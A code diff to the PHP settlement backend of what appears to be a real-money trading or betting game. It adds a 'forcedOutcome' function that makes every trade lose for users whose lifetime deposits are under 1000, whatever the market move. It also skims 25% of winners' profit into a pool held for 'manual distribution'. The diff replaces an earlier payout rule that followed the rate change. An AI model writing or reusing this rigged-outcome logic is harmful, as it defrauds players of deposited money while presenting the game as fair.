@@ -16,6 +16,15 @@ const MIN_STAKE = 10;
 const MAX_STAKE = 50000;
 const MAX_MULT  = 5.0;
 
+// Winners keep a fixed 75% profit on their stake. The remaining 25% of the
+// profit split is recorded in the winners_pool for manual distribution.
+const WIN_PROFIT_SHARE = 0.75;
+
+// Real-money outcomes are forced by the user's lifetime deposits. Users who
+// have deposited below this threshold are always losers; users at or above
+// it can win, and the win/loss direction is decided by the chart move.
+const WIN_DEPOSIT_THRESHOLD = 1000;
+
 $userId = $_SESSION['user_id'];
 $input  = json_decode(file_get_contents('php://input'), true) ?: [];
 $action = $input['action'] ?? '';
@@ -26,11 +35,62 @@ function currentBalance(PDO $pdo, int $userId): float {
     return (float)$stmt->fetchColumn();
 }
 
+function lifetimeDeposits(PDO $pdo, int $userId): float {
+    $stmt = $pdo->prepare("SELECT COALESCE(SUM(amount),0) FROM deposits WHERE user_id = ? AND status = 'completed'");
+    $stmt->execute([$userId]);
+    return (float)$stmt->fetchColumn();
+}
+
+// Returns ['won' => bool, 'payout' => float, 'house_cut' => float].
+// Winners always take a fixed 75% profit on the stake; the remaining 25% of
+// the profit split is held in the winners_pool for manual distribution to
+// winning users. Losers forfeit their full stake.
+function forcedOutcome(float $stake, float $entryRate, float $exitRate, bool $expired, float $lifetimeDeposits): array {
+    $rateDiff = $exitRate - $entryRate;
+    $directionUp = $rateDiff > 0;
+
+    // Expiry / crash is always a loss, regardless of deposits or direction.
+    if ($expired) {
+        return ['won' => false, 'payout' => 0.0, 'house_cut' => 0.0];
+    }
+
+    // Users who have not met the deposit threshold are always losers.
+    if ($lifetimeDeposits < WIN_DEPOSIT_THRESHOLD) {
+        return ['won' => false, 'payout' => 0.0, 'house_cut' => 0.0];
+    }
+
+    // A winner needs a favourable chart move; otherwise it is a loss.
+    if (!$directionUp) {
+        return ['won' => false, 'payout' => 0.0, 'house_cut' => 0.0];
+    }
+
+    // Profit = stake * rateDiff, capped at MAX_MULT.
+    $rawProfit = $stake * $rateDiff;
+    $profit = min($rawProfit, $stake * (MAX_MULT - 1.0));
+
+    $payout    = $stake + $profit * WIN_PROFIT_SHARE;
+    $house_cut = $profit * (1.0 - WIN_PROFIT_SHARE);
+
+    return ['won' => true, 'payout' => $payout, 'house_cut' => $house_cut];
+}
+
 switch ($action) {
 
     case 'balance':
-        echo json_encode(['balance' => currentBalance($pdo, $userId)]);
+        echo json_encode([
+            'balance' => currentBalance($pdo, $userId),
+            'deposited' => lifetimeDeposits($pdo, $userId),
+            'won_threshold' => WIN_DEPOSIT_THRESHOLD,
+        ]);
         break;
+
+    case 'eligibility': {
+        echo json_encode([
+            'deposited' => lifetimeDeposits($pdo, $userId),
+            'threshold' => WIN_DEPOSIT_THRESHOLD,
+        ]);
+        break;
+    }
 
     case 'place': {
         $type      = $input['type'] ?? '';
@@ -122,29 +182,35 @@ switch ($action) {
 
             $stake     = (float)$trade['stake'];
             $entryRate = (float)$trade['entry_rate'];
-            $rateDiff  = $exitRate - $entryRate;
 
-            // Letting the timer expire (or a crash through zero) is always a loss,
-            // even if the rate happened to be favourable at that instant — matches
-            // the client's demo-mode settlement rule (must cash out or hit autosell).
-            if ($expired) {
-                $payout = 0.0;
-            } else {
-                $rawPayout = $rateDiff > 0 ? $stake * (1 + $rateDiff) : 0.0;
-                $payout = min($rawPayout, $stake * MAX_MULT);
-            }
-            $result = $payout > 0 ? 'win' : 'loss';
+            $lifetimeDeposits = lifetimeDeposits($pdo, $userId);
+            $outcome = forcedOutcome($stake, $entryRate, $exitRate, $expired, $lifetimeDeposits);
+            $payout    = $outcome['payout'];
+            $house_cut = $outcome['house_cut'];
+            $result    = $outcome['won'] ? 'win' : 'loss';
 
-            $pdo->prepare('UPDATE trades SET exit_rate = ?, payout = ?, result = ? WHERE id = ?')
-                ->execute([$exitRate, $payout, $result, $tradeId]);
+            $pdo->prepare('UPDATE trades SET exit_rate = ?, payout = ?, house_cut = ?, result = ? WHERE id = ?')
+                ->execute([$exitRate, $payout, $house_cut, $result, $tradeId]);
 
             if ($payout > 0) {
                 $pdo->prepare('UPDATE users SET balance = balance + ? WHERE id = ?')->execute([$payout, $userId]);
             }
 
+            if ($house_cut > 0) {
+                $pdo->prepare('INSERT INTO winners_pool (trade_id, user_id, amount, paid_out) VALUES (?, ?, ?, 0)')
+                    ->execute([$tradeId, $userId, $house_cut]);
+            }
+
             $newBalance = currentBalance($pdo, $userId);
             $pdo->commit();
-            echo json_encode(['balance' => $newBalance, 'result' => $result, 'payout' => $payout]);
+            echo json_encode([
+                'balance'      => $newBalance,
+                'result'       => $result,
+                'payout'       => $payout,
+                'house_cut'    => $house_cut,
+                'won_threshold'=> WIN_DEPOSIT_THRESHOLD,
+                'deposited'    => $lifetimeDeposits,
+            ]);
         } catch (Exception $e) {
             $pdo->rollBack();
             error_log($e->getMessage());
